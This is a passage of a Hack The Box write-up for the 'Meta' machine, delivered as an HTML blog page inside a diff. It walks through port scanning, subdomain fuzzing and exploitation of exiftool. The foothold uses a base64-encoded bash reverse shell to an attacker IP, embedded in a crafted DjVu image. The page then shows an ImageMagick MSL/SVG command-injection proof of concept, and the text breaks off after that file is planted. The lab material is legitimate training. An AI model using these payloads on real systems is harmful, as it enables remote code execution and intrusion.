@@ -1,0 +1,258 @@
+<!doctype html><html lang="es"><head><title>Meta | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Medium machine. This machine has a website that analyzes uploaded images with a vulnerable version of exiftool that leads to RCE. Then, there is a Cron job that transforms images using ImageMagick&rsquo;s mogrify command, which is vulnerable to command injection. Finally, we have sudo permissions on neofetch, which leads to privilege escalation"><meta itemprop="description" content="Hack The Box. Linux. Medium machine. This machine has a website that analyzes uploaded images with a vulnerable version of exiftool that leads to RCE. Then, there is a Cron job that transforms images using ImageMagick&rsquo;s mogrify command, which is vulnerable to command injection. Finally, we have sudo permissions on neofetch, which leads to privilege escalation"><meta name="twitter:card" content="Hack The Box. Linux. Medium machine. This machine has a website that analyzes uploaded images with a vulnerable version of exiftool that leads to RCE. Then, there is a Cron job that transforms images using ImageMagick&rsquo;s mogrify command, which is vulnerable to command injection. Finally, we have sudo permissions on neofetch, which leads to privilege escalation"><meta name="twitter:description" content="Hack The Box. Linux. Medium machine. This machine has a website that analyzes uploaded images with a vulnerable version of exiftool that leads to RCE. Then, there is a Cron job that transforms images using ImageMagick&rsquo;s mogrify command, which is vulnerable to command injection. Finally, we have sudo permissions on neofetch, which leads to privilege escalation"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine has a website that analyzes uploaded images with a vulnerable version of exiftool that leads to RCE. Then, there is a Cron job that transforms images using ImageMagick&rsquo;s mogrify command, which is vulnerable to command injection. Finally, we have sudo permissions on neofetch, which leads to privilege escalation"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/HTB/Meta/Meta.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Meta/Meta.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Meta/Meta.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="Meta"><meta property="twitter:title" content="Meta"><meta property="og:title" content="Meta"><meta property="og:url" content="https://7rocky.github.io/en/htb/meta/"><meta itemprop="keywords" content="cve,sudo,cronjob,file-upload,command-injection,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/meta/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb7" role="main"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label="aside" class="instapaper_ignoref b helvetica tracked">HTB</aside><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/meta/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/meta/&text=Meta" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/meta/&title=Meta" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Meta</h1><time class="f6 mv4 dib tracked" datetime="2022-06-11T00:00:00+01:00">11 / 06 / 2022</time></header><div class="htb-image"><img alt="Meta" src="/images/HTB/Meta/Meta.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/sudo" title="sudo">sudo</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cronjob" title="Cron jobs">Cron jobs</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/file-upload" title="File upload">File upload</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/command-injection" title="Command Injection">Command Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin-bottom:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a><ul><li><a href="#exploiting-exiftool">Exploiting <code>exiftool</code></a></li></ul></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#lateral-movement-to-user-thomas">Lateral movement to user <code>thomas</code></a><ul><li><a href="#exploiting-mogrify">Exploiting <code>mogrify</code></a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.140</li><li><strong>Release</strong>: 22 / 01 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted -p 22,80 10.10.11.140
+Nmap scan report for 10.10.11.140
+Host is up (0.064s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
+|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
+|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
+80/tcp open  http    Apache httpd
+|_http-title: Did not follow redirect to http://artcorp.htb
+|_http-server-header: Apache
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 10.97 seconds
+</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.11.140</code>, we are redirected to <code>http://artcorp.htb</code>, so we need to add this domain in <code>/etc/hosts</code>. Then we have this website:</p><p><img src="/images/HTB/Meta/Meta-1.png" alt="Meta 1"></p><p>It seems to be just a static website. Let&rsquo;s apply fuzzing to enumerate more routes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://artcorp.htb/FUZZ
+<span class="code-dark-blue">assets                  [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 49ms]</span>
+<span class="code-dark-blue">css                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 51ms]</span>
+<span class="code-dark-green">                        [Status: 200, Size: 4427, Words: 1663, Lines: 87, Duration: 74ms]</span>  
+<span class="code-dark-yellow">server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 83ms]
+</code></pre></div><p>Nothing interesting at all. Since there is a domain <code>artcorp.htb</code>, it is likely that there exist subdomains. Let&rsquo;s enumerate:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.140/ -H <span class="code-dark-yellow">'Host: FUZZ.artcorp.htb'</span> -r -fl 87  
+<span class="code-dark-green">dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 59ms]
+</code></pre></div><p>Alright, now we can enter <code>dev01.artcorp.htb</code> in <code>/etc/hosts</code>. We have this website:</p><p><img src="/images/HTB/Meta/Meta-2.png" alt="Meta 2"></p><p><img src="/images/HTB/Meta/Meta-3.png" alt="Meta 3"></p><h2 id="foothold">Foothold</h2><p>So we have the chance to upload images. And this is the output:</p><p><img src="/images/HTB/Meta/Meta-4.png" alt="Meta 4"></p><h3 id="exploiting-exiftool">Exploiting <code>exiftool</code></h3><p>Actually, that&rsquo;s the output of <code>exiftool</code>. There exists some <a href="https://www.opencve.io/cve?vendor=exiftool_project">CVE regarding <code>exiftool</code></a>. Indeed, the one that is exploitable is the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23935">CVE-2022-23935</a>, similar to the one exploited in <a href="../overflow#foothold-on-the-machine">Overflow</a>. So, let&rsquo;s reproduce the steps (more information <a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">here</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+
+<span class="code-cyan">$</span> <span class="code-dark-green">vim</span> payload
+
+<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">payload</span>
+(metadata "\c${system('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash')};")  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">bzz</span> <span class="mtku">payload</span> payload.bzz
+
+<span class="code-cyan">$</span> <span class="code-dark-green">djvumake</span> <span class="mtku">exploit.djvu</span> INFO=<span class="code-dark-yellow">'1,1'</span> BGjp=/dev/null ANTz=payload.bzz
+
+<span class="code-cyan">$</span> <span class="code-dark-green">vim</span> configfile
+
+<span class="code-cyan">$</span> <span class="code-dark-green">exiftool</span> -config <span class="mtku">configfile</span> <span class="code-dark-yellow">'-HasselbladExif<=exploit.djvu'</span> <span class="mtku">hacker.jpg</span>
+    1 image files updated
+</code></pre></div><p>Now, we upload the maliciously crafted image and we get a reverse shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'</span> | <span class="code-dark-green">base64</span>
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+
+<span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.140.
+Ncat: Connection from 10.10.11.140:45692.
+bash: cannot set terminal process group (624): Inappropriate ioctl for device  
+bash: no job control in this shell
+www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cd /
+cd /
+www-data@meta:/$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@meta:/$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@meta:/$ export TERM=xterm
+www-data@meta:/$ export SHELL=bash
+www-data@meta:/$ stty rows 50 columns 158
+</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>After basic enumeration, we can try to enumerate running processes or Cron jobs using <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-blue">CMD: UID=0    PID=22988  | /usr/sbin/CRON -f</span>
+<span class="code-magenta">CMD: UID=1000 PID=22987  | /bin/bash /usr/local/bin/convert_images.sh</span>
+<span class="code-blue">CMD: UID=0    PID=22989  | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/*</span>
+<span class="code-magenta">CMD: UID=1000 PID=22990  | /bin/bash /usr/local/bin/convert_images.sh</span>
+<span class="code-blue">CMD: UID=0    PID=22992  | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/*</span>
+<span class="code-blue">CMD: UID=0    PID=22991  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf</span>  
+<span class="code-blue">CMD: UID=0    PID=22993  | /bin/sh -c rm /tmp/*</span>
+<span class="code-magenta">CMD: UID=1000 PID=22994  | pkill mogrify
+</code></pre></div><p>We find interesting commands:</p><ul><li><code>/bin/bash /usr/local/bin/convert_images.sh</code></li><li><code>cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf</code></li></ul><h2 id="lateral-movement-to-user-thomas">Lateral movement to user <code>thomas</code></h2><p>The second one is executed by user <code>thomas</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls /home
+thomas
+www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -la /home/thomas
+total 32
+drwxr-xr-x 4 thomas thomas 4096 Jan 17  2022 .
+drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..
+lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout
+-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc
+drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config
+-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile
+drwx------ 2 thomas thomas 4096 Jan  4  2022 .ssh
+-rw-r----- 1 root   thomas   33 Oct 10 14:28 user.txt
+www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -la /home/thomas/.config/  
+total 12
+drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .
+drwxr-xr-x 4 thomas thomas 4096 Jan 17  2022 ..
+drwxr-xr-x 2 thomas thomas 4096 Dec 20  2021 neofetch
+</code></pre></div><p>So it is not interesting yet. Let&rsquo;s focus on the first command:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@meta:/tmp$ cat /usr/local/bin/convert_images.sh  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>
+<span class="mtk7">cd</span><span class="mtk1"> /var/www/dev01.artcorp.htb/convert_images/ </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> /usr/local/bin/mogrify -format png </span><span class="mtk5">*</span><span class="mtk1">.</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">2&gt;</span><span class="mtk1">/dev/null  </span>  
+<span class="mtk1">pkill mogrify</span>
+</code></pre></div><h3 id="exploiting-mogrify">Exploiting <code>mogrify</code></h3><p>It uses <code>mogrify</code> to format PNG images. Actually, <code>mogrify</code> is part of <a href="https://imagemagick.org/">ImageMagick</a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>www-data@meta:/tmp$ file /usr/local/bin/mogrify
+/usr/local/bin/mogrify: symbolic link to magick
+www-data@meta:/tmp$ ls -l /usr/local/bin/mogrify
+lrwxrwxrwx 1 root root 6 Aug 29  2021 /usr/local/bin/mogrify -&gt; magick
+www-data@meta:/tmp$ ls -l /usr/local/bin/magick
+-rwxr-xr-x 1 root root 40048 Aug 29  2021 /usr/local/bin/magick
+www-data@meta:/tmp$ file /usr/local/bin/magick
+/usr/local/bin/magick: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fd45a758ab7b339514d807f4864ab010510497ac, with debug_info, not stripped  
+</code></pre></div><p>We have version 7.0.10-36:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ /usr/local/bin/magick -version  
+Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
+Copyright: © 1999-2020 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5)
+Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
+</code></pre></div><p>There are some vulnerabilities regarding <a href="https://imagemagick.org/">ImageMagick</a>. The one that is exploitable has to do with command injection (more information <a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">here</a>). We can reproduce a proof of concept with this SVG file:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;</span><span class="mtk5">image</span><span class="mtk1"> </span><span class="mtk8">authenticate</span><span class="mtk1">=</span><span class="mtk4">'ff" `echo $(id)&gt; /dev/shm/0wned`;"'</span><span class="mtk1">&gt;</span>
+<span class="mtk1">  &lt;</span><span class="mtk5">read</span><span class="mtk1"> </span><span class="mtk8">filename</span><span class="mtk1">=</span><span class="mtk4">"pdf:/etc/passwd"</span><span class="mtk1">/&gt;</span>
+<span class="mtk1">  &lt;</span><span class="mtk5">get</span><span class="mtk1"> </span><span class="mtk8">width</span><span class="mtk1">=</span><span class="mtk4">"base-width"</span><span class="mtk1"> </span><span class="mtk8">height</span><span class="mtk1">=</span><span class="mtk4">"base-height"</span><span class="mtk1"> /&gt;</span>
+<span class="mtk1">  &lt;</span><span class="mtk5">resize</span><span class="mtk1"> </span><span class="mtk8">geometry</span><span class="mtk1">=</span><span class="mtk4">"400x400"</span><span class="mtk1"> /&gt;</span>
+<span class="mtk1">  &lt;</span><span class="mtk5">write</span><span class="mtk1"> </span><span class="mtk8">filename</span><span class="mtk1">=</span><span class="mtk4">"test.png"</span><span class="mtk1"> /&gt;</span>
+<span class="mtk1">  &lt;</span><span class="mtk5">svg</span><span class="mtk1"> </span><span class="mtk8">width</span><span class="mtk1">=</span><span class="mtk4">"700"</span><span class="mtk1"> </span><span class="mtk8">height</span><span class="mtk1">=</span><span class="mtk4">"700"</span><span class="mtk1"> </span><span class="mtk8">xmlns</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://www.w3.org/2000/svg</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk8">xmlns:xlink</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://www.w3.org/1999/xlink</span><span class="mtk4">"</span><span class="mtk1">&gt;       </span>  
+<span class="mtk1">  &lt;</span><span class="mtk5">image</span><span class="mtk1"> </span><span class="mtk8">xlink:href</span><span class="mtk1">=</span><span class="mtk4">"msl:poc.svg"</span><span class="mtk1"> </span><span class="mtk8">height</span><span class="mtk1">=</span><span class="mtk4">"100"</span><span class="mtk1"> </span><span class="mtk8">width</span><span class="mtk1">=</span><span class="mtk4">"100"</span><span class="mtk1">/&gt;</span>
+<span class="mtk1">  &lt;/</span><span class="mtk5">svg</span><span class="mtk1">&gt;</span>
+<span class="mtk1">&lt;/</span><span class="mtk5">image</span><span class="mtk1">&gt;</span>
+</code></pre></div><p>Let&rsquo;s create the file and wait until we see the file named <code>0wned</code> in <code>/dev/shm</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cd /tmp
+www-data@meta:/tmp$ cat &gt; poc.svg
+&lt;image authenticate='ff" `echo $(id)&gt; /dev/shm/0wned`;"'&gt;
+  &lt;read filename="pdf:/etc/passwd"/&gt;
+  &lt;get width="base-width" height="base-height" /&gt;
+  &lt;resize geometry="400x400" /&gt;
+  &lt;write filename="test.png" /&gt;
+  &lt;svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;  
+  &lt;image xlink:href="msl:poc.svg" height="100" width="100"/&gt;
+  &lt;/svg&gt;
+&lt;/image&gt;
+^C
+www-data@meta:/tmp$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/
